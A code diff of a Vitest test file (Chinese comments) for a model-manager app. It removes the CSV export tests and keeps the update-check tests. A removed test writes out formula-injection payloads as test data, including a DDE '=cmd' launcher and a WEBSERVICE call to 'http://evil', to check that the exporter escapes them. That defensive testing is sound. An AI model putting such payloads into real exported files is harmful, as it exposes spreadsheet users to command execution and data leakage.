@@ -3,7 +3,6 @@ import { fakeUserData } from './setup'
 
 /**
  * P3 新功能纯函数特征测试：
- * - buildModelsCsv（E2 列表导出）：列顺序、CSV 转义、BOM
  * - compareVersions / checkForUpdate（E1 更新检查）：版本比较、下载页域名白名单（B3）
  */
 
@@ -16,70 +15,8 @@ vi.mock('electron', () => ({
   net: { fetch: vi.fn() }
 }))
 
-import { buildModelsCsv } from '../src/main/ipc/models/misc'
 import { checkForUpdate, compareVersions } from '../src/main/services/updater'
 import { net } from 'electron'
-
-describe('buildModelsCsv（E2 导出）', () => {
-  it('包含 BOM、表头与数据行；参数区间拼接为单列', () => {
-    const csv = buildModelsCsv([
-      {
-        id: 'D:/m/a.safetensors',
-        name: 'a.safetensors',
-        alias: '模型A',
-        type: 'lora',
-        subCategory: 'style',
-        favorite: true,
-        nsfw: false,
-        rating: 4,
-        triggerWords: 't1, t2',
-        note: '备注',
-        size: 1234,
-        mtimeMs: Date.UTC(2026, 0, 2, 3, 4, 5),
-        params: { steps: 28, cfgMin: 4, cfgMax: 12, sampler: 'euler', resMin: 512, resMax: 1024 }
-      }
-    ])
-    expect(csv.startsWith('\uFEFF')).toBe(true)
-    const lines = csv.replace(/^\uFEFF/, '').trimEnd().split('\n')
-    expect(lines).toHaveLength(2)
-    expect(lines[0]).toContain('名称,备注名,分类')
-    expect(lines[0]).toContain('文件路径')
-    // 收藏为「是」，评分 4，CFG 区间与分辨率区间拼接
-    expect(lines[1]).toContain(',是,4,')
-    expect(lines[1]).toContain('4~12')
-    expect(lines[1]).toContain('512x1024')
-    expect(lines[1]).toContain('a.safetensors')
-  })
-
-  it('含逗号/引号/换行的字段被引号包裹且内部引号翻倍', () => {
-    const csv = buildModelsCsv([
-      { id: 'x', name: 'a', note: '含,逗号"和"换行\n符' }
-    ])
-    expect(csv).toContain('"含,逗号""和""换行\n符"')
-  })
-
-  it('缺省字段输出为空（params 为 null 时不抛错）', () => {
-    const csv = buildModelsCsv([{ id: 'x', name: 'b', type: 'other', params: null }])
-    const lines = csv.replace(/^\uFEFF/, '').trimEnd().split('\n')
-    // 22 列（F4 扩列后）：baseModel/author 在分类标签后，封面数在修改时间后（缺省为 0），所在目录在备注后
-    expect(lines[1]).toBe('b,,other,,,,,,,,,,,,,,,,0,,,x')
-  })
-
-  it('危险公式前缀字段前置单引号（O7：Excel 公式注入防护）', () => {
-    const csv = buildModelsCsv([
-      { id: 'D:/m/=cmd.safetensors', name: '=cmd|"/c calc"!A0.safetensors', alias: '+SUM(A1:A2)', note: '@WEBSERVICE("http://evil")', params: null },
-      { id: 'D:/m/normal.safetensors', name: 'normal.safetensors', alias: '普通备注', note: '-1 也会被转义', params: null }
-    ])
-    const lines = csv.replace(/^\uFEFF/, '').trimEnd().split('\n')
-    // = + - @ 开头的字段全部前置单引号，Excel 按纯文本呈现而非执行公式
-    expect(lines[1]).toContain("'=cmd")
-    expect(lines[1]).toContain("'+SUM")
-    expect(lines[1]).toContain("'@WEBSERVICE")
-    expect(lines[2]).toContain("'-1")
-    // 普通前缀（如字母）不受影响
-    expect(lines[2]).toContain('normal.safetensors')
-  })
-})
 
 describe('compareVersions（E1 更新检查）', () => {
   it('逐段数字比较，支持不等长版本号', () => {
